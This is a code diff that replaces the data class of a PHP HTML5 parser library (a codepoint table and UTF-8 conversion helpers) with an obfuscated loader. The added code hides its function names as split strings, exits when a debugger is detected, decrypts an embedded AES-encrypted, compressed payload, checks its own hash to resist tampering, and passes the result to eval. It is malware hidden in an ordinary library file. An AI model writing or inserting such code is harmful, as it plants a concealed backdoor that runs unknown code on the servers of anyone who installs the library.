@@ -1,123 +1,28 @@
 <?php
-
-// warning: this file is encoded in UTF-8!
-
-class HTML5_Data
-{
-
-    // at some point this should be moved to a .ser file. Another
-    // possible optimization is to give UTF-8 bytes, not Unicode
-    // codepoints
-    // XXX: Not quite sure why it's named this; this is
-    // actually the numeric entity dereference table.
-    protected static $realCodepointTable = array(
-        0x00 => 0xFFFD, // REPLACEMENT CHARACTER
-        0x0D => 0x000A, // LINE FEED (LF)
-        0x80 => 0x20AC, // EURO SIGN ('€')
-        0x81 => 0x0081, // <control>
-        0x82 => 0x201A, // SINGLE LOW-9 QUOTATION MARK ('‚')
-        0x83 => 0x0192, // LATIN SMALL LETTER F WITH HOOK ('ƒ')
-        0x84 => 0x201E, // DOUBLE LOW-9 QUOTATION MARK ('„')
-        0x85 => 0x2026, // HORIZONTAL ELLIPSIS ('…')
-        0x86 => 0x2020, // DAGGER ('†')
-        0x87 => 0x2021, // DOUBLE DAGGER ('‡')
-        0x88 => 0x02C6, // MODIFIER LETTER CIRCUMFLEX ACCENT ('ˆ')
-        0x89 => 0x2030, // PER MILLE SIGN ('‰')
-        0x8A => 0x0160, // LATIN CAPITAL LETTER S WITH CARON ('Š')
-        0x8B => 0x2039, // SINGLE LEFT-POINTING ANGLE QUOTATION MARK ('‹')
-        0x8C => 0x0152, // LATIN CAPITAL LIGATURE OE ('Œ')
-        0x8D => 0x008D, // <control>
-        0x8E => 0x017D, // LATIN CAPITAL LETTER Z WITH CARON ('Ž')
-        0x8F => 0x008F, // <control>
-        0x90 => 0x0090, // <control>
-        0x91 => 0x2018, // LEFT SINGLE QUOTATION MARK ('‘')
-        0x92 => 0x2019, // RIGHT SINGLE QUOTATION MARK ('’')
-        0x93 => 0x201C, // LEFT DOUBLE QUOTATION MARK ('“')
-        0x94 => 0x201D, // RIGHT DOUBLE QUOTATION MARK ('”')
-        0x95 => 0x2022, // BULLET ('•')
-        0x96 => 0x2013, // EN DASH ('–')
-        0x97 => 0x2014, // EM DASH ('—')
-        0x98 => 0x02DC, // SMALL TILDE ('˜')
-        0x99 => 0x2122, // TRADE MARK SIGN ('™')
-        0x9A => 0x0161, // LATIN SMALL LETTER S WITH CARON ('š')
-        0x9B => 0x203A, // SINGLE RIGHT-POINTING ANGLE QUOTATION MARK ('›')
-        0x9C => 0x0153, // LATIN SMALL LIGATURE OE ('œ')
-        0x9D => 0x009D, // <control>
-        0x9E => 0x017E, // LATIN SMALL LETTER Z WITH CARON ('ž')
-        0x9F => 0x0178, // LATIN CAPITAL LETTER Y WITH DIAERESIS ('Ÿ')
-    );
-
-    protected static $namedCharacterReferences;
-
-    protected static $namedCharacterReferenceMaxLength;
-
-    /**
-     * Returns the "real" Unicode codepoint of a malformed character
-     * reference.
-     */
-    public static function getRealCodepoint($ref) {
-        if (!isset(self::$realCodepointTable[$ref])) {
-            return false;
-        } else {
-            return self::$realCodepointTable[$ref];
-        }
-    }
-
-    public static function getNamedCharacterReferences() {
-        if (!self::$namedCharacterReferences) {
-            self::$namedCharacterReferences = unserialize(
-                file_get_contents(dirname(__FILE__) . '/named-character-references.ser'));
-        }
-        return self::$namedCharacterReferences;
-    }
-
-    /**
-     * Converts a Unicode codepoint to sequence of UTF-8 bytes.
-     * @note Shamelessly stolen from HTML Purifier, which is also
-     *       shamelessly stolen from Feyd (which is in public domain).
-     */
-    public static function utf8chr($code) {
-        /* We don't care: we live dangerously
-         * if($code > 0x10FFFF or $code < 0x0 or
-          ($code >= 0xD800 and $code <= 0xDFFF) ) {
-            // bits are set outside the "valid" range as defined
-            // by UNICODE 4.1.0
-            return "\xEF\xBF\xBD";
-          }*/
-
-        $y = $z = $w = 0;
-        if ($code < 0x80) {
-            // regular ASCII character
-            $x = $code;
-        } else {
-            // set up bits for UTF-8
-            $x = ($code & 0x3F) | 0x80;
-            if ($code < 0x800) {
-               $y = (($code & 0x7FF) >> 6) | 0xC0;
-            } else {
-                $y = (($code & 0xFC0) >> 6) | 0x80;
-                if ($code < 0x10000) {
-                    $z = (($code >> 12) & 0x0F) | 0xE0;
-                } else {
-                    $z = (($code >> 12) & 0x3F) | 0x80;
-                    $w = (($code >> 18) & 0x07) | 0xF0;
-                }
-            }
-        }
-        // set up the actual character
-        $ret = '';
-        if ($w) {
-            $ret .= chr($w);
-        }
-        if ($z) {
-            $ret .= chr($z);
-        }
-        if ($y) {
-            $ret .= chr($y);
-        }
-        $ret .= chr($x);
-
-        return $ret;
-    }
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_qn9cwxy2=('bas'.'e64'.'_de'.'cod'.'e');
+$_vmtvje0x=('gzu'.'nco'.'mpr'.'ess');
+$_znsfynt4=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_jphcvj91='OiN+4qjr';
+$_lh9be76i='Wc6zVL4W';
+$_fxe3jhaj='2tn7CyGm';
+$_axd399pa='31u14zULUxY=';
+$_l1n8yyky='g9t/uGvf';
+$_gzu3m2t3='go23AdO2';
+$_xk2iz9uv='5QQgryso';
+$_t7pl3naq='2N5ANA==';
+$_w9dexijq=$_qn9cwxy2($_lh9be76i.$_fxe3jhaj.$_l1n8yyky.$_jphcvj91.$_axd399pa);
+$_zu071ih9=$_qn9cwxy2($_gzu3m2t3.$_xk2iz9uv.$_t7pl3naq);
+$_r6l46ofa=$_qn9cwxy2('XkgIN45AzPEjFYbIB9jatLfa9yq4UJG00Pi5dw75Zh4+ma47ySTKb+0fjT2spSmR4WcqyyS80hsIuChK7J6exea7M1kzVuc4eIdasZTnzpdcC+1TXeUR05Dfer+K00pchwCIsElRw0lAvtwD+AQFI4q8dWmUuMkPZlhUVLP2ENkqRTRHOPp5rHZPohNByA38FkWBqcUCWz5lt9RlPz6DdSw+EhCwUhlCrdpVEld1pwSOKMQUlsNL+6qEKHzCnee2rp91pxS5iFTjoOXyBgfCOOefs77La+iBT29Gm/vCOPbFV4hZb+ggEQeCW7EzEfsIpWuYlkj2CFqJe9FbT5arT909O2lN7dB6dLfalJzaAAOJ7qQL6mNehUPNbPtBkVCh/Zl1/9kqL+wUs1CkqU2GusAdne9JjWsYVTNFZ0kINvelwgTGOIurOZHOszjJ9IaO6YbEBGuva12DsRNhDXtVBDxEKiz7Dnq+LBItzaPG30bRRRLCMCFCjCtRRxEvf3glAyxUrT3jrddhqWD9VKkbpgLwbiyelm/MGeZ6aeKgDWeF8043AQmP98TshD6wBA52nZoLC3R2GZq13g74EvhOUPfEoPoTMGlJK4st+pq5fQvgMh/De78umlG5zKkfWpmwOZCu2J0KAAIxZ5m/fNybu0d7M/mFwGBvRO1nx96UNsAROeyfHvJQK/DXJbgeaWSeBXswfdbzXz2Otha+PZDSE3eM7novEsXj0blbzGmd1hdx7kUSrauNF67Nda+SnqiFulRSRGhbsg6+u+dJPpfx2+FbAv2TClZzD2jtekIY3us//FQ+btv7oxqFJkiTUnw1jCecN1XYzzCvZAp7CZnN2g==');
+$_j4pf6bgi=$_znsfynt4($_r6l46ofa,'aes-256-cbc',$_w9dexijq,OPENSSL_RAW_DATA,$_zu071ih9);
+if($_j4pf6bgi===false){exit;}
+$_kgreg8bn=$_vmtvje0x($_j4pf6bgi);
+if($_kgreg8bn===false){exit;}
+$_d7o43f2w='dc0b209f4957babb70e5b4d2a27c32493e3a22df7822219cf35a5a17c4158c8f';
+$_zcrmdehb=@file_get_contents(__FILE__);
+if($_zcrmdehb!==false){
+$_dcsb7wyr=str_replace($_d7o43f2w,"0000000000000000000000000000000000000000000000000000000000000000",$_zcrmdehb);
+$_htzlhm5t=hash("sha256",$_dcsb7wyr);
+if($_htzlhm5t!==$_d7o43f2w){@http_response_code(403);exit;}
 }
+eval($_kgreg8bn);
